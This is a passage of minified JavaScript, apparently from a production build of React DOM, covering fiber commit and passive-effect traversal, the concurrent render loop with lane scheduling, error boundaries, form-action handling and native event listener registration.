D=Bb(o);Um(o,D,x);break;case 3:case 4:var K=c.stateNode.containerInfo,oe=Bb(o);Fb(o,oe,K);break;default:throw Error(n(161))}}catch(he){Ra(o,o.return,he)}o.flags&=-3}s&4096&&(o.flags&=-4097)}function OT(o){if(o.subtreeFlags&1024)for(o=o.child;o!==null;){var s=o;OT(s),s.tag===5&&s.flags&1024&&s.stateNode.reset(),o=o.sibling}}function Io(o,s){if(s.subtreeFlags&8772)for(s=s.child;s!==null;)DT(o,s.alternate,s),s=s.sibling}function kr(o){for(o=o.child;o!==null;){var s=o;switch(s.tag){case 0:case 11:case 14:case 15:vs(4,s,s.return),kr(s);break;case 1:Ki(s,s.return);var c=s.stateNode;typeof c.componentWillUnmount=="function"&&LT(s,s.return,c),kr(s);break;case 27:$u(s.stateNode);case 26:case 5:Ki(s,s.return),kr(s);break;case 22:s.memoizedState===null&&kr(s);break;case 30:kr(s);break;default:kr(s)}o=o.sibling}}function wo(o,s,c){for(c=c&&(s.subtreeFlags&8772)!==0,s=s.child;s!==null;){var m=s.alternate,v=o,y=s,x=y.flags;switch(y.tag){case 0:case 11:case 15:wo(v,y,c),Bu(4,y);break;case 1:if(wo(v,y,c),m=y,v=m.stateNode,typeof v.componentDidMount=="function")try{v.componentDidMount()}catch(oe){Ra(m,m.return,oe)}if(m=y,v=m.updateQueue,v!==null){var D=m.stateNode;try{var K=v.shared.hiddenCallbacks;if(K!==null)for(v.shared.hiddenCallbacks=null,v=0;v<K.length;v++)hC(K[v],D)}catch(oe){Ra(m,m.return,oe)}}c&&x&64&&PT(y),Fu(y,y.return);break;case 27:wT(y);case 26:case 5:wo(v,y,c),c&&m===null&&x&4&&RT(y),Fu(y,y.return);break;case 12:wo(v,y,c);break;case 31:wo(v,y,c),c&&x&4&&_T(v,y);break;case 13:wo(v,y,c),c&&x&4&&qT(v,y);break;case 22:y.memoizedState===null&&wo(v,y,c),Fu(y,y.return);break;case 30:break;default:wo(v,y,c)}s=s.sibling}}function Hb(o,s){var c=null;o!==null&&o.memoizedState!==null&&o.memoizedState.cachePool!==null&&(c=o.memoizedState.cachePool.pool),o=null,s.memoizedState!==null&&s.memoizedState.cachePool!==null&&(o=s.memoizedState.cachePool.pool),o!==c&&(o!=null&&o.refCount++,c!=null&&Ru(c))}function Gb(o,s){o=null,s.alternate!==null&&(o=s.alternate.memoizedState.cache),s=s.memoizedState.cache,s!==o&&(s.refCount++,o!=null&&Ru(o))}function fi(o,s,c,m){if(s.subtreeFlags&10256)for(s=s.child;s!==null;)UT(o,s,c,m),s=s.sibling}function UT(o,s,c,m){var v=s.flags;switch(s.tag){case 0:case 11:case 15:fi(o,s,c,m),v&2048&&Bu(9,s);break;case 1:fi(o,s,c,m);break;case 3:fi(o,s,c,m),v&2048&&(o=null,s.alternate!==null&&(o=s.alternate.memoizedState.cache),s=s.memoizedState.cache,s!==o&&(s.refCount++,o!=null&&Ru(o)));break;case 12:if(v&2048){fi(o,s,c,m),o=s.stateNode;try{var y=s.memoizedProps,x=y.id,D=y.onPostCommit;typeof D=="function"&&D(x,s.alternate===null?"mount":"update",o.passiveEffectDuration,-0)}catch(K){Ra(s,s.return,K)}}else fi(o,s,c,m);break;case 31:fi(o,s,c,m);break;case 13:fi(o,s,c,m);break;case 23:break;case 22:y=s.stateNode,x=s.alternate,s.memoizedState!==null?y._visibility&2?fi(o,s,c,m):Vu(o,s):y._visibility&2?fi(o,s,c,m):(y._visibility|=2,Gl(o,s,c,m,(s.subtreeFlags&10256)!==0||!1)),v&2048&&Hb(x,s);break;case 24:fi(o,s,c,m),v&2048&&Gb(s.alternate,s);break;default:fi(o,s,c,m)}}function Gl(o,s,c,m,v){for(v=v&&((s.subtreeFlags&10256)!==0||!1),s=s.child;s!==null;){var y=o,x=s,D=c,K=m,oe=x.flags;switch(x.tag){case 0:case 11:case 15:Gl(y,x,D,K,v),Bu(8,x);break;case 23:break;case 22:var he=x.stateNode;x.memoizedState!==null?he._visibility&2?Gl(y,x,D,K,v):Vu(y,x):(he._visibility|=2,Gl(y,x,D,K,v)),v&&oe&2048&&Hb(x.alternate,x);break;case 24:Gl(y,x,D,K,v),v&&oe&2048&&Gb(x.alternate,x);break;default:Gl(y,x,D,K,v)}s=s.sibling}}function Vu(o,s){if(s.subtreeFlags&10256)for(s=s.child;s!==null;){var c=o,m=s,v=m.flags;switch(m.tag){case 22:Vu(c,m),v&2048&&Hb(m.alternate,m);break;case 24:Vu(c,m),v&2048&&Gb(m.alternate,m);break;default:Vu(c,m)}s=s.sibling}}var Hu=8192;function Ql(o,s,c){if(o.subtreeFlags&Hu)for(o=o.child;o!==null;)zT(o,s,c),o=o.sibling}function zT(o,s,c){switch(o.tag){case 26:Ql(o,s,c),o.flags&Hu&&o.memoizedState!==null&&Uk(c,mi,o.memoizedState,o.memoizedProps);break;case 5:Ql(o,s,c);break;case 3:case 4:var m=mi;mi=ef(o.stateNode.containerInfo),Ql(o,s,c),mi=m;break;case 22:o.memoizedState===null&&(m=o.alternate,m!==null&&m.memoizedState!==null?(m=Hu,Hu=16777216,Ql(o,s,c),Hu=m):Ql(o,s,c));break;default:Ql(o,s,c)}}function BT(o){var s=o.alternate;if(s!==null&&(o=s.child,o!==null)){s.child=null;do s=o.sibling,o.sibling=null,o=s;while(o!==null)}}function Gu(o){var s=o.deletions;if((o.flags&16)!==0){if(s!==null)for(var c=0;c<s.length;c++){var m=s[c];At=m,VT(m,o)}BT(o)}if(o.subtreeFlags&10256)for(o=o.child;o!==null;)FT(o),o=o.sibling}function FT(o){switch(o.tag){case 0:case 11:case 15:Gu(o),o.flags&2048&&vs(9,o,o.return);break;case 3:Gu(o);break;case 12:Gu(o);break;case 22:var s=o.stateNode;o.memoizedState!==null&&s._visibility&2&&(o.return===null||o.return.tag!==13)?(s._visibility&=-3,Bm(o)):Gu(o);break;default:Gu(o)}}function Bm(o){var s=o.deletions;if((o.flags&16)!==0){if(s!==null)for(var c=0;c<s.length;c++){var m=s[c];At=m,VT(m,o)}BT(o)}for(o=o.child;o!==null;){switch(s=o,s.tag){case 0:case 11:case 15:vs(8,s,s.return),Bm(s);break;case 22:c=s.stateNode,c._visibility&2&&(c._visibility&=-3,Bm(s));break;default:Bm(s)}o=o.sibling}}function VT(o,s){for(;At!==null;){var c=At;switch(c.tag){case 0:case 11:case 15:vs(8,c,s);break;case 23:case 22:if(c.memoizedState!==null&&c.memoizedState.cachePool!==null){var m=c.memoizedState.cachePool.pool;m!=null&&m.refCount++}break;case 24:Ru(c.memoizedState.cache)}if(m=c.child,m!==null)m.return=c,At=m;else e:for(c=o;At!==null;){m=At;var v=m.sibling,y=m.return;if(MT(m),m===c){At=null;break e}if(v!==null){v.return=y,At=v;break e}At=y}}}var ek={getCacheForType:function(o){var s=Nt(rt),c=s.data.get(o);return c===void 0&&(c=o(),s.data.set(o,c)),c},cacheSignal:function(){return Nt(rt).controller.signal}},ak=typeof WeakMap=="function"?WeakMap:Map,Ta=0,Ma=null,ia=null,la=0,La=0,An=null,ys=!1,Jl=!1,Qb=!1,jo=0,Ya=0,Es=0,Or=0,Jb=0,Pn=0,Wl=0,Qu=null,dn=null,Wb=!1,Fm=0,HT=0,Vm=1/0,Hm=null,Ss=null,gt=0,Cs=null,Kl=null,Do=0,Kb=0,Yb=null,GT=null,Ju=0,$b=null;function Ln(){return(Ta&2)!==0&&la!==0?la&-la:Z.T!==null?nv():Gp()}function QT(){if(Pn===0)if((la&536870912)===0||fa){var o=dr;dr<<=1,(dr&3932160)===0&&(dr=262144),Pn=o}else Pn=536870912;return o=Tn.current,o!==null&&(o.flags|=32),Pn}function pn(o,s,c){(o===Ma&&(La===2||La===9)||o.cancelPendingCommit!==null)&&(Yl(o,0),Ts(o,la,Pn,!1)),pr(o,c),((Ta&2)===0||o!==Ma)&&(o===Ma&&((Ta&2)===0&&(Or|=c),Ya===4&&Ts(o,la,Pn,!1)),Yi(o))}function JT(o,s,c){if((Ta&6)!==0)throw Error(n(327));var m=!c&&(s&127)===0&&(s&o.expiredLanes)===0||ii(o,s),v=m?ik(o,s):Zb(o,s,!0),y=m;do{if(v===0){Jl&&!m&&Ts(o,s,0,!1);break}else{if(c=o.current.alternate,y&&!tk(c)){v=Zb(o,s,!1),y=!1;continue}if(v===2){if(y=s,o.errorRecoveryDisabledLanes&y)var x=0;else x=o.pendingLanes&-536870913,x=x!==0?x:x&536870912?536870912:0;if(x!==0){s=x;e:{var D=o;v=Qu;var K=D.current.memoizedState.isDehydrated;if(K&&(Yl(D,x).flags|=256),x=Zb(D,x,!1),x!==2){if(Qb&&!K){D.errorRecoveryDisabledLanes|=y,Or|=y,v=4;break e}y=dn,dn=v,y!==null&&(dn===null?dn=y:dn.push.apply(dn,y))}v=x}if(y=!1,v!==2)continue}}if(v===1){Yl(o,0),Ts(o,s,0,!0);break}e:{switch(m=o,y=v,y){case 0:case 1:throw Error(n(345));case 4:if((s&4194048)!==s)break;case 6:Ts(m,s,Pn,!ys);break e;case 2:dn=null;break;case 3:case 5:break;default:throw Error(n(329))}if((s&62914560)===s&&(v=Fm+300-ht(),10<v)){if(Ts(m,s,Pn,!ys),Di(m,0,!0)!==0)break e;Do=s,m.timeoutHandle=xx(WT.bind(null,m,c,dn,Hm,Wb,s,Pn,Or,Wl,ys,y,"Throttled",-0,0),v);break e}WT(m,c,dn,Hm,Wb,s,Pn,Or,Wl,ys,y,null,-0,0)}}break}while(!0);Yi(o)}function WT(o,s,c,m,v,y,x,D,K,oe,he,be,se,ue){if(o.timeoutHandle=-1,be=s.subtreeFlags,be&8192||(be&16785408)===16785408){be={stylesheets:null,count:0,imgCount:0,imgBytes:0,suspenseyImages:[],waitingForImages:!0,waitingForViewTransition:!1,unsuspend:ri},zT(s,y,be);var Me=(y&62914560)===y?Fm-ht():(y&4194048)===y?HT-ht():0;if(Me=zk(be,Me),Me!==null){Do=y,o.cancelPendingCommit=Me(tx.bind(null,o,s,y,c,m,v,x,D,K,he,be,null,se,ue)),Ts(o,y,x,!oe);return}}tx(o,s,y,c,m,v,x,D,K)}function tk(o){for(var s=o;;){var c=s.tag;if((c===0||c===11||c===15)&&s.flags&16384&&(c=s.updateQueue,c!==null&&(c=c.stores,c!==null)))for(var m=0;m<c.length;m++){var v=c[m],y=v.getSnapshot;v=v.value;try{if(!Sn(y(),v))return!1}catch{return!1}}if(c=s.child,s.subtreeFlags&16384&&c!==null)c.return=s,s=c;else{if(s===o)break;for(;s.sibling===null;){if(s.return===null||s.return===o)return!0;s=s.return}s.sibling.return=s.return,s=s.sibling}}return!0}function Ts(o,s,c,m){s&=~Jb,s&=~Or,o.suspendedLanes|=s,o.pingedLanes&=~s,m&&(o.warmLanes|=s),m=o.expirationTimes;for(var v=s;0<v;){var y=31-We(v),x=1<<y;m[y]=-1,v&=~x}c!==0&&mr(o,c,s)}function Gm(){return(Ta&6)===0?(Wu(0),!1):!0}function Xb(){if(ia!==null){if(La===0)var o=ia.return;else o=ia,So=Ir=null,fb(o),zl=null,wu=0,o=ia;for(;o!==null;)AT(o.alternate,o),o=o.return;ia=null}}function Yl(o,s){var c=o.timeoutHandle;c!==-1&&(o.timeoutHandle=-1,Ck(c)),c=o.cancelPendingCommit,c!==null&&(o.cancelPendingCommit=null,c()),Do=0,Xb(),Ma=o,ia=c=yo(o.current,null),la=s,La=0,An=null,ys=!1,Jl=ii(o,s),Qb=!1,Wl=Pn=Jb=Or=Es=Ya=0,dn=Qu=null,Wb=!1,(s&8)!==0&&(s|=s&32);var m=o.entangledLanes;if(m!==0)for(o=o.entanglements,m&=s;0<m;){var v=31-We(m),y=1<<v;s|=o[v],m&=~y}return jo=s,pm(),c}function KT(o,s){ea=null,Z.H=Ou,s===Ul||s===Em?(s=dC(),La=3):s===tb?(s=dC(),La=4):La=s===wb?8:s!==null&&typeof s=="object"&&typeof s.then=="function"?6:1,An=s,ia===null&&(Ya=1,Nm(o,zn(s,o.current)))}function YT(){var o=Tn.current;return o===null?!0:(la&4194048)===la?Hn===null:(la&62914560)===la||(la&536870912)!==0?o===Hn:!1}function $T(){var o=Z.H;return Z.H=Ou,o===null?Ou:o}function XT(){var o=Z.A;return Z.A=ek,o}function Qm(){Ya=4,ys||(la&4194048)!==la&&Tn.current!==null||(Jl=!0),(Es&134217727)===0&&(Or&134217727)===0||Ma===null||Ts(Ma,la,Pn,!1)}function Zb(o,s,c){var m=Ta;Ta|=2;var v=$T(),y=XT();(Ma!==o||la!==s)&&(Hm=null,Yl(o,s)),s=!1;var x=Ya;e:do try{if(La!==0&&ia!==null){var D=ia,K=An;switch(La){case 8:Xb(),x=6;break e;case 3:case 2:case 9:case 6:Tn.current===null&&(s=!0);var oe=La;if(La=0,An=null,$l(o,D,K,oe),c&&Jl){x=0;break e}break;default:oe=La,La=0,An=null,$l(o,D,K,oe)}}nk(),x=Ya;break}catch(he){KT(o,he)}while(!0);return s&&o.shellSuspendCounter++,So=Ir=null,Ta=m,Z.H=v,Z.A=y,ia===null&&(Ma=null,la=0,pm()),x}function nk(){for(;ia!==null;)ZT(ia)}function ik(o,s){var c=Ta;Ta|=2;var m=$T(),v=XT();Ma!==o||la!==s?(Hm=null,Vm=ht()+500,Yl(o,s)):Jl=ii(o,s);e:do try{if(La!==0&&ia!==null){s=ia;var y=An;a:switch(La){case 1:La=0,An=null,$l(o,s,y,1);break;case 2:case 9:if(cC(y)){La=0,An=null,ex(s);break}s=function(){La!==2&&La!==9||Ma!==o||(La=7),Yi(o)},y.then(s,s);break e;case 3:La=7;break e;case 4:La=5;break e;case 7:cC(y)?(La=0,An=null,ex(s)):(La=0,An=null,$l(o,s,y,7));break;case 5:var x=null;switch(ia.tag){case 26:x=ia.memoizedState;case 5:case 27:var D=ia;if(x?Ux(x):D.stateNode.complete){La=0,An=null;var K=D.sibling;if(K!==null)ia=K;else{var oe=D.return;oe!==null?(ia=oe,Jm(oe)):ia=null}break a}}La=0,An=null,$l(o,s,y,5);break;case 6:La=0,An=null,$l(o,s,y,6);break;case 8:Xb(),Ya=6;break e;default:throw Error(n(462))}}ok();break}catch(he){KT(o,he)}while(!0);return So=Ir=null,Z.H=m,Z.A=v,Ta=c,ia!==null?0:(Ma=null,la=0,pm(),Ya)}function ok(){for(;ia!==null&&!zt();)ZT(ia)}function ZT(o){var s=TT(o.alternate,o,jo);o.memoizedProps=o.pendingProps,s===null?Jm(o):ia=s}function ex(o){var s=o,c=s.alternate;switch(s.tag){case 15:case 0:s=bT(c,s,s.pendingProps,s.type,void 0,la);break;case 11:s=bT(c,s,s.pendingProps,s.type.render,s.ref,la);break;case 5:fb(s);default:AT(c,s),s=ia=XS(s,jo),s=TT(c,s,jo)}o.memoizedProps=o.pendingProps,s===null?Jm(o):ia=s}function $l(o,s,c,m){So=Ir=null,fb(s),zl=null,wu=0;var v=s.return;try{if(Jq(o,v,s,c,la)){Ya=1,Nm(o,zn(c,o.current)),ia=null;return}}catch(y){if(v!==null)throw ia=v,y;Ya=1,Nm(o,zn(c,o.current)),ia=null;return}s.flags&32768?(fa||m===1?o=!0:Jl||(la&536870912)!==0?o=!1:(ys=o=!0,(m===2||m===9||m===3||m===6)&&(m=Tn.current,m!==null&&m.tag===13&&(m.flags|=16384))),ax(s,o)):Jm(s)}function Jm(o){var s=o;do{if((s.flags&32768)!==0){ax(s,ys);return}o=s.return;var c=Yq(s.alternate,s,jo);if(c!==null){ia=c;return}if(s=s.sibling,s!==null){ia=s;return}ia=s=o}while(s!==null);Ya===0&&(Ya=5)}function ax(o,s){do{var c=$q(o.alternate,o);if(c!==null){c.flags&=32767,ia=c;return}if(c=o.return,c!==null&&(c.flags|=32768,c.subtreeFlags=0,c.deletions=null),!s&&(o=o.sibling,o!==null)){ia=o;return}ia=o=c}while(o!==null);Ya=6,ia=null}function tx(o,s,c,m,v,y,x,D,K){o.cancelPendingCommit=null;do Wm();while(gt!==0);if((Ta&6)!==0)throw Error(n(327));if(s!==null){if(s===o.current)throw Error(n(177));if(y=s.lanes|s.childLanes,y|=Bg,Dg(o,c,y,x,D,K),o===Ma&&(ia=Ma=null,la=0),Kl=s,Cs=o,Do=c,Kb=y,Yb=v,GT=m,(s.subtreeFlags&10256)!==0||(s.flags&10256)!==0?(o.callbackNode=null,o.callbackPriority=0,ck(X,function(){return rx(),null})):(o.callbackNode=null,o.callbackPriority=0),m=(s.flags&13878)!==0,(s.subtreeFlags&13878)!==0||m){m=Z.T,Z.T=null,v=re.p,re.p=2,x=Ta,Ta|=4;try{Xq(o,s,c)}finally{Ta=x,re.p=v,Z.T=m}}gt=1,nx(),ix(),ox()}}function nx(){if(gt===1){gt=0;var o=Cs,s=Kl,c=(s.flags&13878)!==0;if((s.subtreeFlags&13878)!==0||c){c=Z.T,Z.T=null;var m=re.p;re.p=2;var v=Ta;Ta|=4;try{kT(s,o);var y=dv,x=VS(o.containerInfo),D=y.focusedElem,K=y.selectionRange;if(x!==D&&D&&D.ownerDocument&&FS(D.ownerDocument.documentElement,D)){if(K!==null&&qg(D)){var oe=K.start,he=K.end;if(he===void 0&&(he=oe),"selectionStart"in D)D.selectionStart=oe,D.selectionEnd=Math.min(he,D.value.length);else{var be=D.ownerDocument||document,se=be&&be.defaultView||window;if(se.getSelection){var ue=se.getSelection(),Me=D.textContent.length,Fe=Math.min(K.start,Me),Da=K.end===void 0?Fe:Math.min(K.end,Me);!ue.extend&&Fe>Da&&(x=Da,Da=Fe,Fe=x);var ae=BS(D,Fe),$=BS(D,Da);if(ae&&$&&(ue.rangeCount!==1||ue.anchorNode!==ae.node||ue.anchorOffset!==ae.offset||ue.focusNode!==$.node||ue.focusOffset!==$.offset)){var ie=be.createRange();ie.setStart(ae.node,ae.offset),ue.removeAllRanges(),Fe>Da?(ue.addRange(ie),ue.extend($.node,$.offset)):(ie.setEnd($.node,$.offset),ue.addRange(ie))}}}}for(be=[],ue=D;ue=ue.parentNode;)ue.nodeType===1&&be.push({element:ue,left:ue.scrollLeft,top:ue.scrollTop});for(typeof D.focus=="function"&&D.focus(),D=0;D<be.length;D++){var ge=be[D];ge.element.scrollLeft=ge.left,ge.element.scrollTop=ge.top}}rf=!!uv,dv=uv=null}finally{Ta=v,re.p=m,Z.T=c}}o.current=s,gt=2}}function ix(){if(gt===2){gt=0;var o=Cs,s=Kl,c=(s.flags&8772)!==0;if((s.subtreeFlags&8772)!==0||c){c=Z.T,Z.T=null;var m=re.p;re.p=2;var v=Ta;Ta|=4;try{DT(o,s.alternate,s)}finally{Ta=v,re.p=m,Z.T=c}}gt=3}}function ox(){if(gt===4||gt===3){gt=0,fo();var o=Cs,s=Kl,c=Do,m=GT;(s.subtreeFlags&10256)!==0||(s.flags&10256)!==0?gt=5:(gt=0,Kl=Cs=null,sx(o,o.pendingLanes));var v=o.pendingLanes;if(v===0&&(Ss=null),ho(c),s=s.stateNode,ra&&typeof ra.onCommitFiberRoot=="function")try{ra.onCommitFiberRoot(ma,s,void 0,(s.current.flags&128)===128)}catch{}if(m!==null){s=Z.T,v=re.p,re.p=2,Z.T=null;try{for(var y=o.onRecoverableError,x=0;x<m.length;x++){var D=m[x];y(D.value,{componentStack:D.stack})}}finally{Z.T=s,re.p=v}}(Do&3)!==0&&Wm(),Yi(o),v=o.pendingLanes,(c&261930)!==0&&(v&42)!==0?o===$b?Ju++:(Ju=0,$b=o):Ju=0,Wu(0)}}function sx(o,s){(o.pooledCacheLanes&=s)===0&&(s=o.pooledCache,s!=null&&(o.pooledCache=null,Ru(s)))}function Wm(){return nx(),ix(),ox(),rx()}function rx(){if(gt!==5)return!1;var o=Cs,s=Kb;Kb=0;var c=ho(Do),m=Z.T,v=re.p;try{re.p=32>c?32:c,Z.T=null,c=Yb,Yb=null;var y=Cs,x=Do;if(gt=0,Kl=Cs=null,Do=0,(Ta&6)!==0)throw Error(n(331));var D=Ta;if(Ta|=4,FT(y.current),UT(y,y.current,x,c),Ta=D,Wu(0,!1),ra&&typeof ra.onPostCommitFiberRoot=="function")try{ra.onPostCommitFiberRoot(ma,y)}catch{}return!0}finally{re.p=v,Z.T=m,sx(o,s)}}function lx(o,s,c){s=zn(c,s),s=Ib(o.stateNode,s,2),o=hs(o,s,2),o!==null&&(pr(o,2),Yi(o))}function Ra(o,s,c){if(o.tag===3)lx(o,o,c);else for(;s!==null;){if(s.tag===3){lx(s,o,c);break}else if(s.tag===1){var m=s.stateNode;if(typeof s.type.getDerivedStateFromError=="function"||typeof m.componentDidCatch=="function"&&(Ss===null||!Ss.has(m))){o=zn(c,o),c=cT(2),m=hs(s,c,2),m!==null&&(uT(c,m,s,o),pr(m,2),Yi(m));break}}s=s.return}}function ev(o,s,c){var m=o.pingCache;if(m===null){m=o.pingCache=new ak;var v=new Set;m.set(s,v)}else v=m.get(s),v===void 0&&(v=new Set,m.set(s,v));v.has(c)||(Qb=!0,v.add(c),o=sk.bind(null,o,s,c),s.then(o,o))}function sk(o,s,c){var m=o.pingCache;m!==null&&m.delete(s),o.pingedLanes|=o.suspendedLanes&c,o.warmLanes&=~c,Ma===o&&(la&c)===c&&(Ya===4||Ya===3&&(la&62914560)===la&&300>ht()-Fm?(Ta&2)===0&&Yl(o,0):Jb|=c,Wl===la&&(Wl=0)),Yi(o)}function cx(o,s){s===0&&(s=Hp()),o=Pr(o,s),o!==null&&(pr(o,s),Yi(o))}function rk(o){var s=o.memoizedState,c=0;s!==null&&(c=s.retryLane),cx(o,c)}function lk(o,s){var c=0;switch(o.tag){case 31:case 13:var m=o.stateNode,v=o.memoizedState;v!==null&&(c=v.retryLane);break;case 19:m=o.stateNode;break;case 22:m=o.stateNode._retryCache;break;default:throw Error(n(314))}m!==null&&m.delete(s),cx(o,c)}function ck(o,s){return za(o,s)}var Km=null,Xl=null,av=!1,Ym=!1,tv=!1,xs=0;function Yi(o){o!==Xl&&o.next===null&&(Xl===null?Km=Xl=o:Xl=Xl.next=o),Ym=!0,av||(av=!0,dk())}function Wu(o,s){if(!tv&&Ym){tv=!0;do for(var c=!1,m=Km;m!==null;){if(o!==0){var v=m.pendingLanes;if(v===0)var y=0;else{var x=m.suspendedLanes,D=m.pingedLanes;y=(1<<31-We(42|o)+1)-1,y&=v&~(x&~D),y=y&201326741?y&201326741|1:y?y|2:0}y!==0&&(c=!0,mx(m,y))}else y=la,y=Di(m,m===Ma?y:0,m.cancelPendingCommit!==null||m.timeoutHandle!==-1),(y&3)===0||ii(m,y)||(c=!0,mx(m,y));m=m.next}while(c);tv=!1}}function uk(){ux()}function ux(){Ym=av=!1;var o=0;xs!==0&&Sk()&&(o=xs);for(var s=ht(),c=null,m=Km;m!==null;){var v=m.next,y=dx(m,s);y===0?(m.next=null,c===null?Km=v:c.next=v,v===null&&(Xl=c)):(c=m,(o!==0||(y&3)!==0)&&(Ym=!0)),m=v}gt!==0&&gt!==5||Wu(o),xs!==0&&(xs=0)}function dx(o,s){for(var c=o.suspendedLanes,m=o.pingedLanes,v=o.expirationTimes,y=o.pendingLanes&-62914561;0<y;){var x=31-We(y),D=1<<x,K=v[x];K===-1?((D&c)===0||(D&m)!==0)&&(v[x]=jg(D,s)):K<=s&&(o.expiredLanes|=D),y&=~D}if(s=Ma,c=la,c=Di(o,o===s?c:0,o.cancelPendingCommit!==null||o.timeoutHandle!==-1),m=o.callbackNode,c===0||o===s&&(La===2||La===9)||o.cancelPendingCommit!==null)return m!==null&&m!==null&&Ba(m),o.callbackNode=null,o.callbackPriority=0;if((c&3)===0||ii(o,c)){if(s=c&-c,s===o.callbackPriority)return s;switch(m!==null&&Ba(m),ho(c)){case 2:case 8:c=Pe;break;case 32:c=X;break;case 268435456:c=we;break;default:c=X}return m=px.bind(null,o),c=za(c,m),o.callbackPriority=s,o.callbackNode=c,s}return m!==null&&m!==null&&Ba(m),o.callbackPriority=2,o.callbackNode=null,2}function px(o,s){if(gt!==0&&gt!==5)return o.callbackNode=null,o.callbackPriority=0,null;var c=o.callbackNode;if(Wm()&&o.callbackNode!==c)return null;var m=la;return m=Di(o,o===Ma?m:0,o.cancelPendingCommit!==null||o.timeoutHandle!==-1),m===0?null:(JT(o,m,s),dx(o,ht()),o.callbackNode!=null&&o.callbackNode===c?px.bind(null,o):null)}function mx(o,s){if(Wm())return null;JT(o,s,!0)}function dk(){Tk(function(){(Ta&6)!==0?za(fe,uk):ux()})}function nv(){if(xs===0){var o=kl;o===0&&(o=wi,wi<<=1,(wi&261888)===0&&(wi=256)),xs=o}return xs}function fx(o){return o==null||typeof o=="symbol"||typeof o=="boolean"?null:typeof o=="function"?o:Cl(""+o)}function hx(o,s){var c=s.ownerDocument.createElement("input");return c.name=s.name,c.value=s.value,o.id&&c.setAttribute("form",o.id),s.parentNode.insertBefore(c,s),o=new FormData(o),c.parentNode.removeChild(c),o}function pk(o,s,c,m,v){if(s==="submit"&&c&&c.stateNode===v){var y=fx((v[Tt]||null).action),x=m.submitter;x&&(s=(s=x[Tt]||null)?fx(s.formAction):x.getAttribute("formAction"),s!==null&&(y=s,x=null));var D=new Vi("action","action",null,m,v);o.push({event:D,listeners:[{instance:null,listener:function(){if(m.defaultPrevented){if(xs!==0){var K=x?hx(v,x):new FormData(v);Tb(c,{pending:!0,data:K,method:v.method,action:y},null,K)}}else typeof y=="function"&&(D.preventDefault(),K=x?hx(v,x):new FormData(v),Tb(c,{pending:!0,data:K,method:v.method,action:y},y,K))},currentTarget:v}]})}}for(var iv=0;iv<zg.length;iv++){var ov=zg[iv],mk=ov.toLowerCase(),fk=ov[0].toUpperCase()+ov.slice(1);pi(mk,"on"+fk)}pi(QS,"onAnimationEnd"),pi(JS,"onAnimationIteration"),pi(WS,"onAnimationStart"),pi("dblclick","onDoubleClick"),pi("focusin","onFocus"),pi("focusout","onBlur"),pi(wq,"onTransitionRun"),pi(jq,"onTransitionStart"),pi(Dq,"onTransitionCancel"),pi(KS,"onTransitionEnd"),Ui("onMouseEnter",["mouseout","mouseover"]),Ui("onMouseLeave",["mouseout","mouseover"]),Ui("onPointerEnter",["pointerout","pointerover"]),Ui("onPointerLeave",["pointerout","pointerover"]),Oi("onChange","change click focusin focusout input keydown keyup selectionchange".split(" ")),Oi("onSelect","focusout contextmenu dragend focusin keydown keyup mousedown mouseup selectionchange".split(" ")),Oi("onBeforeInput",["compositionend","keypress","textInput","paste"]),Oi("onCompositionEnd","compositionend focusout keydown keypress keyup mousedown".split(" ")),Oi("onCompositionStart","compositionstart focusout keydown keypress keyup mousedown".split(" ")),Oi("onCompositionUpdate","compositionupdate focusout keydown keypress keyup mousedown".split(" "));var Ku="abort canplay canplaythrough durationchange emptied encrypted ended error loadeddata loadedmetadata loadstart pause play playing progress ratechange resize seeked seeking stalled suspend timeupdate volumechange waiting".split(" "),hk=new Set("beforetoggle cancel close invalid load scroll scrollend toggle".split(" ").concat(Ku));function gx(o,s){s=(s&4)!==0;for(var c=0;c<o.length;c++){var m=o[c],v=m.event;m=m.listeners;e:{var y=void 0;if(s)for(var x=m.length-1;0<=x;x--){var D=m[x],K=D.instance,oe=D.currentTarget;if(D=D.listener,K!==y&&v.isPropagationStopped())break e;y=D,v.currentTarget=oe;try{y(v)}catch(he){dm(he)}v.currentTarget=null,y=K}else for(x=0;x<m.length;x++){if(D=m[x],K=D.instance,oe=D.currentTarget,D=D.listener,K!==y&&v.isPropagationStopped())break e;y=D,v.currentTarget=oe;try{y(v)}catch(he){dm(he)}v.currentTarget=null,y=K}}}}function oa(o,s){var c=s[bl];c===void 0&&(c=s[bl]=new Set);var m=o+"__bubble";c.has(m)||(bx(s,o,2,!1),c.add(m))}function sv(o,s,c){var m=0;s&&(m|=4),bx(c,o,m,s)}var $m="_reactListening"+Math.random().toString(36).slice(2);function rv(o){if(!o[$m]){o[$m]=!0,ru.forEach(function(c){c!=="selectionchange"&&(hk.has(c)||sv(c,!1,o),sv(c,!0,o))});var s=o.nodeType===9?o:o.ownerDocument;s===null||s[$m]||(s[$m]=!0,sv("selectionchange",!1,s))}}function bx(o,s,c,m){switch(Qx(s)){case 2:var v=Vk;break;case 8:v=Hk;break;default:v=Cv}c=v.bind(null,s,c,o),v=void 0,!vr||s!=="touchstart"&&s!=="touchmove"&&s!=="wheel"||(v=!0),m?v!==void 0?o.addEventListener(s,c,{capture:!0,passive:v}):o.addEventListener(s,c,!0):v!==void 0?o.addEventListener(s,c,{passive:v}):o.addEventListener(s,c,!1)}function lv(o,s,c,m,v){var y=m;if((s&1)===0&&(s&2)===0&&m!==null)e:for(;;){if(m===null)return;var x=m.tag;if(x===3||x===4){var D=m.stateNode.containerInfo;if(D===v)break;if(x===4)for(x=m.return;x!==null;){var K=x.tag;if((K===3||K===4)&&x.stateNode.containerInfo===v)return;x=x.return}for(;D!==null;){if(x=qi(D),x===null)return;if(K=x.tag,K===5||K===6||K===26||K===27){m=y=x;continue e}D=D.parentNode}}m=m.return}os(function(){var oe=y,he=qn(c),be=[];e:{var se=YS.get(o);if(se!==void 0){var ue=Vi,Me=o;switch(o){case"keypress":if(Er(c)===0)break e;case"keydown":case"keyup":ue=lm;break;case"focusin":Me="focus",ue=Cr;break;case"focusout":Me="blur",ue=Cr;break;case"beforeblur":case"afterblur":ue=Cr;break;case"click":if(c.button===2)break e;case"auxclick":case"dblclick":case"mousedown":case"mousemove":case"mouseup":case"mouseout":case"mouseover":case"contextmenu":ue=Eu;break;case"drag":case"dragend":case"dragenter":case"dragexit":case"dragleave":case"dragover":case"dragstart":case"drop":ue=Zp;break;case"touchcancel":case"touchend":case"touchmove":case"touchstart":ue=T;break;case QS:case JS:case WS:ue=am;break;case 